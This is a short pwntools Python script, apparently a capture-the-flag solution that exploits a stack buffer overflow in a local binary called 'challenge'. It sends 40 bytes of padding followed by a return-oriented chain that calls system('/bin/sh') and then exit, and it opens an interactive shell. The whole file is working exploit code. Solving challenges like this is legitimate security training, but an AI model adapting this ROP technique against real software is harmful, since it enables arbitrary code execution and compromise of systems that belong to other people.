from pwn import *

elf = ELF("./challenge")
rop = ROP(elf)

gs = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
p = start()
sys = elf.plt['system']
exit = elf.plt['exit']
binsh = next(elf.search(b"/bin/sh\x00"))
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = pop_rdi + 1 

payload = b"A"*40
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(sys)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(exit)
p.sendafter(b"send your input:\n", payload)
p.interactive()